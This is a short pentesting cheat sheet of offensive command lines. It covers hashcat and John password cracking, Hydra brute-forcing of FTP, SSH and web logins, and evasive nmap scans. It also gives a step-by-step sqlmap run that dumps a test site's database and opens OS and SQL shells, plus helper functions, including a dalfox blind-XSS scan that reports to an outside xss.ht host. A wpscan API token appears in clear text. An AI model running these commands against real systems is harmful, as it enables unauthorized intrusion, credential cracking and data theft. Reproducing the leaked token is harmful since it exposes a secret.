## Cracking
hashcat -m 0 -a 0 -o cracked.txt target_hashes.txt /usr/share/wordlists/rockyou.txt
  -m 0 designates the type of hash we are cracking (MD5);
  -a 0 designates a dictionary attack;
  -o cracked.txt is the output file for the cracked passwords;
  -target_hashes.txt is our input file of hashes;
  -/usr/share/wordlists/rockyou.txt = Path to the wordlist
 
 m - 0:MD5
     100:SHA1
     1400:SHA256
     1700:SHA512
     900:MD4
     3200:BCRYPT

hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.123.101 ftp
hydra -L /usr/share/wordlists.rockyou.txt -P /usr/share/wordlists/rockyou.txt 192.168.123.101 -t 4 ssh
hydra -L [user] -P [password] [IP] http-post-form "/:usernam=^USER^ & password=^PASS^:F=incorrect" -V

john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
zip2john file.zip > crack.txt
john crack.txt --wordlist=rockyou.txt --format=Raw-SHA256

## Scaning

nmap -sV -sC -oA nmap.txt 10.10.10.x
nmap -sC -sV -v -oN nmap.txt 10.10.10.x
nmap -sS -P0 -A -v 10.10.10.x
masscan -e tun0 -pi-65535 --rate=1000
nmap -sU -sV -A -T4 -v -oN udp.txt 10.10.10.x
nmap -v -sS -f -mtu 32 --send-eth --data-length 50 --source-port 8965 -T5 192.168.0.22

## SQLi
URL = http://testphp.vulnweb.com/artists.php?artist=1

Find DBs = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch

Result is DB name acuart

Find Tables = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch

Result is table name users

Find columns = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch

Dump table = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch

Dump the DB = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch

sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx' --random-agent --level=1 --risk=3 --dbs --batch

OS Shell = sqlmap -u 'url' --dbms=mysql --os-shell
SQL Shell = sqlmap -u 'url' --dbms=mysql --sql-shell

## Wireshark

To find DOS (SYN and ACK) : tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0
To find passwords : http.request.method == POST

#Funtions

autogobuster () {
echo "\n [*] Ejecutando gobuster dir -u $1 -w $wordlist -k -t 100 $2 \n"
gobuster -u $1 -w $wordlist -k -t 50 -o out_$(echo $1 | cut -f 2 -d '.')_web.txt $2 
}

autowpscan () {
wpscan --disable-tls-checks  -e u,ap,at,cb,dbe --url $1 --api-token hshBqrQ1A5cmgjT4e3jSljEnn5wMeDCcagLj6yeCO3M -o $(echo $1 | cut -f 3 -d "/").txt
}
autodalfox () {
nohup dalfox -b https://vsh00t.xss.ht file /home/jorge/Cyber-pix/output/$1 --custom-payload /opt/payloads/xss.txt --waf-evasion -w 1000 -o /home/jorge/Cyber-pix/xss-result/$1 &
}

